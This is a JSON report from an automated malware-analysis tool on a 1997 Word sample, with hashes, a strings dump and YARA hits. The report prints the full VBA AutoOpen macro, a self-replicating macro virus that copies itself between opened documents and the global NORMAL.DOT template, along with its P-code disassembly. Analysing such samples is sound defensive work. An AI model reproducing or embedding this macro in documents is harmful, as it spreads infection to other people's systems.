{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"AutoOpen\""
        ],
        "behavior": {
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code"
        },
        "macro": "\n\n\nPublic Sub MAIN()\nDim F$\nDim G$\nDim M$\nOn Error GoTo -1: On Error GoTo MinSize\nF$ = WordBasic.[FileName$]() + \":AutoOpen\"\nG$ = \"Global:AutoOpen\"\nM$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))\nIf M$ = \"NORMAL.DOT\" Then\nWordBasic.MacroCopy G$, F$\nWordBasic.FileSaveAs Format:=1\nElse\nWordBasic.MacroCopy F$, G$\nEnd If\nMinSize:\nEnd Sub\n\n' Processing file: VirusShare_bd356c841b68772c7ec131f17679dcd1\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 965 bytes\n' Macros/VBA/AutoOpen - 1557 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Public Sub MAIN())\n' Line #2:\n' \tDim \n' \tVarDefn False\n' Line #3:\n' \tDim \n' \tVarDefn G\n' Line #4:\n' \tDim \n' \tVarDefn M\n' Line #5:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError MinSize \n' Line #6:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tLitStr 0x0009 \":AutoOpen\"\n' \tAdd \n' \tSt False$ \n' Line #7:\n' \tLitStr 0x000F \"Global:AutoOpen\"\n' \tSt G$ \n' Line #8:\n' \tLitDI2 0x0000 \n' \tLd WordBasic \n' \tArgsMemLd [MacroName$] 0x0001 \n' \tLd WordBasic \n' \tArgsMemLd [MacroFileName$] 0x0001 \n' \tLitDI2 0x000A \n' \tLd WordBasic \n' \tArgsMemLd [Right$] 0x0002 \n' \tArgsLd UCase 0x0001 \n' \tSt M$ \n' Line #9:\n' \tLd M$ \n' \tLitStr 0x000A \"NORMAL.DOT\"\n' \tEq \n' \tIfBlock \n' Line #10:\n' \tLd G$ \n' \tLd False$ \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #11:\n' \tLitDI2 0x0001 \n' \tParamNamed Format$ \n' \tLd WordBasic \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #12:\n' \tElseBlock \n' Line #13:\n' \tLd False$ \n' \tLd G$ \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #14:\n' \tEndIfBlock \n' Line #15:\n' \tLabel MinSize \n' Line #16:\n' \tEndSub \n"
    },
    "filename": "VirusShare_bd356c841b68772c7ec131f17679dcd1",
    "filesize": 27136,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: This is a Macro Goat File, Subject: YOU MAY BE INFECTED BY NOW!, Author: Authorized User, Template: Normal.dot, Last Saved By: Un Athorized User ;), Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Thu Apr 10 16:47:00 1997, Last Saved Time/Date: Thu Apr 10 16:47:00 1997, Number of Pages: 1, Number of Words: 6, Number of Characters: 21, Security: 0",
    "hashes": {
        "md5": "bd356c841b68772c7ec131f17679dcd1",
        "sha1": "98cfe58ae364892ce53a120c8020b20f77ea4605",
        "sha256": "fe84147d0e4d73a634dabf355340b3c242c150a8272f4bc1ec59a3b9f838c96c"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "This is a Macro Goat File.",
            "/ =!",
            "@HP LaserJet 5Si/5Si MX",
            "\\\\NTSERVER\\HP5si",
            "HP5SI",
            "HP LaserJet 5Si/5Si MX",
            "HP LaserJet 5Si/5Si MX",
            "WINWORD",
            "Courier New",
            "\\\\NTSERVER\\HP5si",
            "HP5SI",
            "HP LaserJet 5Si/5Si MX",
            "WINWORD",
            "Courier New",
            "\\\\NTSERVER\\HP5si",
            "HP5SI",
            "This is a Macro Goat File",
            "YOU MAY BE INFECTED BY NOW!",
            "Authorized User",
            "Normal.dot",
            "Un Athorized User ;)",
            "Microsoft Word 8.0",
            "2ZmE",
            "2ZmE",
            "Manage this >:-^)",
            "No Company",
            "This is a Macro Goat File",
            "Title",
            "_PID_GUID",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            ":AutoOpen",
            "Global:AutoOpen",
            "NORMAL.DOT",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oOpen\"",
            "Public",
            " Sub MAI",
            "Dim F$",
            "On Error",
            " GoTo -1",
            "\"MinSi@ze",
            "ordBasic@.[File",
            "]() + \":",
            "+\"Glob",
            "IRigh",
            "Macro",
            "<0)), 1",
            "If .",
            "\"NORMAL.",
            "DOT\" The",
            "+Copy G$,",
            "SaveAs F",
            "ormat:=1`",
            "Els} F",
            "End Ift",
            "3334d0ba8",
            "4334d0ba8",
            "Wordk",
            "Win16~",
            "Win32",
            "goat97=",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Module1b",
            "AutoOpen*",
            "MAIN,",
            "MinSize;",
            "WordBasic",
            "FileName$m",
            "UCase5",
            "Right$y1",
            "MacroFileName$J",
            "MacroName$",
            "MacroCopyE",
            "FileSaveAs",
            "Documentj",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "mMSFo@rms>",
            "F4AED47",
            "E1-B10D-",
            "11D0-AF6",
            "KC0E641D",
            "3.TWD#",
            "Microsof",
            "` Ob",
            " Library",
            "P4!Pc:\\",
            "temp\\VBE",
            "\\&EX&.E",
            "CvOPfficDvO@sf0",
            "cBv\tS2D",
            "F8D04C-5",
            "BFA-101B -BDE5@vAA",
            "SOFFICE97\\",
            ",O97.DLLR",
            " 8.0",
            "ThisDocu ment",
            "AOpen",
            "p@Mn",
            "ThisDocument",
            "AutoOpen",
            "ID=\"{E15AAC49-B18F-11D0-AF60-0000C0E641D5}\"",
            "Document=ThisDocument/&H00000000",
            "Module=AutoOpen",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"95975CF5648E688E688E688E68\"",
            "DPB=\"2A28E3647965796579\"",
            "GC=\"BFBD76139E3D323E323ECD\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.279199",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
